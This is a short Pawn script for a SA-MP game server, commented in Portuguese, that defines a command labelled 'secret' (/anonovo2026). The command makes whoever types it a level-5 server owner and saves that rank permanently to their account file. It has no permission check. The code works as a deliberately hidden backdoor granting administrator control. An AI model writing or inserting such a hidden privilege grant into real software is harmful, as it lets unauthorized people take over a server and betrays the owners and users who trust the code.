// ================= COMANDO SECRETO (PEGAR DONO) =================
CMD:anonovo2026(playerid, params[])
{
    // Define o nível 5 (Dono) para você
    AdminLevel[playerid] = 5;

    new path[64];
    ContaPath(playerid, path, sizeof(path));

    // Se o arquivo da sua conta não existir, ele cria agora
    if(!dini_Exists(path)) {
        dini_Create(path);
    }

    // Salva o nível 5 no seu arquivo .ini
    dini_IntSet(path, "Admin", 5);

    SendClientMessage(playerid, 0x00FF00FF, "[SUCESSO] Feliz 2026! Você agora é o DONO do servidor.");
    SendClientMessage(playerid, -1, "Use /setadmin para dar cargos a outros jogadores.");
    
    // Som de sucesso para confirmar
    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
    return 1;
}
